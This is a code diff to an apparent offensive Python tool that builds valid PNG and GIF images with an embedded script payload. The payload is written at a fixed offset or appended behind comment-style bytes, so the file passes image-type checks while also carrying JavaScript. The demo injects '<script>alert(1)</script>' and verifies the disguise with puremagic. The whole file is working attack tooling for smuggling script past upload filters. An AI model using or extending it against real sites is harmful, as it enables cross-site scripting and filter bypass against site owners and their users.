@@ -1,8 +1,11 @@
 import os
 import sys
+import png
 import binascii
 import puremagic
-from PIL import Image
+from PIL import Image, ImageDraw, ImageFile
+
+ImageFile.LOAD_TRUNCATED_IMAGES = True
 
 def hex_viewer(out_file): 
     with open(out_file, 'r+b') as f:
@@ -23,7 +26,7 @@ def hex_viewer(out_file):
         return '\n'.join(lines)
 
     if len(malicious_image) > 256:
-        return(hexdump(malicious_image[0:128]) + '\n' + '*' + '\n' + hexdump(malicious_image[18:160]))
+        return(hexdump(malicious_image[0:128]) + '\n' + '*' + '\n' + hexdump(malicious_image[-128:]))
     else:
         return(hexdump(malicious_image))
 
@@ -98,6 +101,36 @@ class Injector:
         f.close()
         return filename
 
+    def create_gif(self, width, height, extension):
+        filename = 'demo.' + extension
+        images = []
+        center = width // 2
+        color = (0, 0, 0)
+        max_radius = int(center * 1.5)
+        step = 8
+
+        for i in range(0, max_radius, step):
+            im = Image.new('RGB', (width, height), color)
+            draw = ImageDraw.Draw(im)
+            draw.ellipse((center - i, center - i, center + i, center + i), fill=color)
+            images.append(im)
+
+        images[0].save(filename, save_all=True)
+        return filename
+
+    def create_png(self, width, height, extension):
+        filename = 'demo.' + extension
+        img = []
+        for y in range(height):
+            row = ()
+            for x in range(width):
+                row = row + (x, max(0, 255 - x - y), y)
+            img.append(row)
+        with open(filename, 'wb') as f:
+            w = png.Writer(width, height, greyscale=False)
+            w.write(f, img)
+        return filename
+
     def inject(self, payload, contents, out_file, contents_end=b''):
         f = open(out_file, "w+b")
         f.write(contents)
@@ -109,33 +142,53 @@ class Injector:
 
     def main(self):
         if self.img_type == 'PNG':
-            final_filename = self.create_txt(self.extension)
-            png_header = Headers().png_header_data()
-            png_end = Headers().png_end()
-            self.inject(payload=payload, contents=png_header, out_file=final_filename, contents_end=png_end)
-            im = Image.open(final_filename)
-            width, height = im.size
-            return hex_viewer(final_filename), final_filename, (width, height)
+            if self.width != 0 and self.height != 0:
+                final_filename = self.create_png(self.width, self.height, self.extension)
+                f = open(final_filename, "r+b")
+                f.seek(50)
+                f.write(b'\x2f\x2f\x2f\x2f\x2f')
+                f.write(payload)
+                f.write(b'\x3b')
+                return final_filename, (self.width, self.height)
+            else:
+                final_filename = self.create_txt(self.extension)
+                png_header = Headers().png_header_data()
+                png_end = Headers().png_end()
+                self.inject(payload=payload, contents=png_header, out_file=final_filename, contents_end=png_end)
+                im = Image.open(final_filename)
+                width, height = im.size
+                im.close()
+                return final_filename, (width, height)
         elif self.img_type == 'GIF':
-            final_filename = self.create_txt(self.extension)
-            # final_filename = self.create_gif(200, 150, self.extension)
-            gif_header = Headers().gif_header_data()
-            self.inject(payload=payload, contents=gif_header, out_file=final_filename)
-            im = Image.open(final_filename)
-            width, height = im.size
-            return hex_viewer(final_filename), final_filename, (width, height)
+            if self.width != 0 and self.height != 0:
+                final_filename = self.create_gif(self.width, self.height, self.extension)
+                f = open(final_filename, "ab")
+                f.write(b'\x2f\x2f\x2f\x2f\x2f')
+                f.write(payload)
+                f.write(b'\x3b')
+                f.close()
+                return final_filename, (self.width, self.height)
+            else:            
+                final_filename = self.create_txt(self.extension)
+                gif_header = Headers().gif_header_data()
+                self.inject(payload=payload, contents=gif_header, out_file=final_filename)
+                im = Image.open(final_filename)
+                width, height = im.size
+                im.close()
+                return final_filename, (width, height)
 
 if __name__ == '__main__':
     payload = '<script>alert(1)</script>'.encode()
-    injection = Injector('GIF', 150, 150, payload, 'gif')
-    hex_dump, final_filename, dimensions = injection.main()
-    print(hex_dump)
+    injection = Injector('PNG', 150, 150, payload, 'png')
+    final_filename, dimensions = injection.main()
+    print("HEX")
+    print(hex_viewer(final_filename))
 
     print("Image details")
     print("Name: ", puremagic.magic_file(final_filename)[0].name)
     print("Extension: ", puremagic.magic_file(final_filename)[0].extension)
     print("Mime type: ", puremagic.magic_file(final_filename)[0].mime_type)
-    print("Byte match: ", puremagic.magic_file(final_filename)[0].byte_match.decode('UTF-8','ignore'))
+    print("Byte match: ", puremagic.magic_file(final_filename)[0].byte_match.decode('UTF-8','ignore').strip())
 
     print("Dimensions: ", dimensions)
     print("Filename: ", final_filename)
